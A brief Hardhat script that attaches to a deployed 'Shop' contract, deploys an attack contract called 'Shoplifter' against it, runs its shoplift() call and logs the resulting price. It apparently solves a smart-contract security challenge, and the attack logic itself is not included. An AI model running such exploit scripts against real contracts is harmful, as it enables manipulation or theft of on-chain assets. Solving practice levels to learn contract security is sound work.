// @ts-ignore
import { web3, ethers } from "hardhat";

async function main() {

    const Shopper = await ethers.getContractFactory('Shop')
    const shop = await Shopper.attach("0xd40Be3A15F9400f409897d35B762b16BE87b8C90")

    const attack = await ethers.getContractFactory('Shoplifter')
    const acceptance = await attack.deploy(shop.address)
    await acceptance.deployed()

    const tx = await acceptance.shoplift()
    await tx.wait()

    console.log("Price is:", await shop.price())
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
